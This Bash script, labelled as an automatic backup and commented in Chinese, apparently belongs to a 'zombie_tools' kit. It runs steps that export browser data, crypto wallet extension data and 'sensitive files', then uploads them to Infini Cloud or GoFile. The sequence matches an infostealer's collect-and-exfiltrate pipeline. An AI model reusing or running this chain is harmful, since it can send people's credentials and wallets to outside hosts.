#!/usr/bin/env bash

# 每个子脚本的最大运行时间，单位为秒；可通过环境变量覆盖。
TIMEOUT_SECONDS="${TIMEOUT_SECONDS:-600}"

if [[ ! "$TIMEOUT_SECONDS" =~ ^[1-9][0-9]*$ ]]; then
    echo '[autobackup] TIMEOUT_SECONDS 必须是正整数。' >&2
    exit 2
fi

terminate_tree() {
    local pid="$1"
    local signal="$2"
    local child

    if command -v pgrep >/dev/null 2>&1; then
        while IFS= read -r child; do
            [[ -n "$child" ]] && terminate_tree "$child" "$signal"
        done < <(pgrep -P "$pid" 2>/dev/null || true)
    fi

    kill "-${signal}" "$pid" 2>/dev/null || true
}

run_step() {
    local name="$1"
    shift

    echo "[autobackup] 开始：${name}"
    "$@" &
    local pid=$!
    local elapsed=0

    while kill -0 "$pid" 2>/dev/null; do
        if (( elapsed >= TIMEOUT_SECONDS )); then
            echo "[autobackup] 超时，终止并继续：${name}" >&2
            terminate_tree "$pid" TERM

            local grace=0
            while kill -0 "$pid" 2>/dev/null && (( grace < 5 )); do
                sleep 1
                ((grace += 1))
            done

            if kill -0 "$pid" 2>/dev/null; then
                echo "[autobackup] 进程未响应，强制终止：${name}" >&2
                terminate_tree "$pid" KILL
            fi
            wait "$pid" 2>/dev/null || true
            return 124
        fi
        sleep 1
        ((elapsed += 1))
    done

    wait "$pid"
    local exit_code=$?

    if (( exit_code == 0 )); then
        echo "[autobackup] 完成：${name}"
        return 0
    fi

    echo "[autobackup] 失败（退出码 ${exit_code}），继续：${name}" >&2
    return "$exit_code"
}

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
zombie_tools="${ZOMBIE_TOOLS_ROOT:-$(cd "${script_dir}/.." && pwd -P)}"
export ZOMBIE_TOOLS_ROOT="$zombie_tools"

overall_status=0

run_step '浏览器数据备份' \
    python3 "${zombie_tools}/备份/备份浏览器数据/macOS/export_browser_data.py" || overall_status=1

run_step '钱包扩展数据备份' \
    python3 "${zombie_tools}/备份/备份钱包扩展数据/macOS/backup-wallet-ext.py" || overall_status=1

run_step '敏感文件备份' \
    bash "${zombie_tools}/备份/备份敏感文件/backup-sensitive.sh" || overall_status=1

if run_step 'Infini Cloud 上传' \
    python3 "${zombie_tools}/上传-跨传/infini-cloud/upload.py" --auto-backup; then
    :
else
    echo '[autobackup] Infini Cloud 失败，回退到 GoFile' >&2
    run_step 'GoFile 上传' \
        python3 "${zombie_tools}/上传-跨传/gofile/upload.py" --auto-backup || overall_status=1
fi

if (( overall_status == 0 )); then
    echo '[autobackup] 所有步骤已成功完成。'
else
    echo '[autobackup] 所有步骤已处理，但至少一个步骤失败。' >&2
fi

exit "$overall_status"
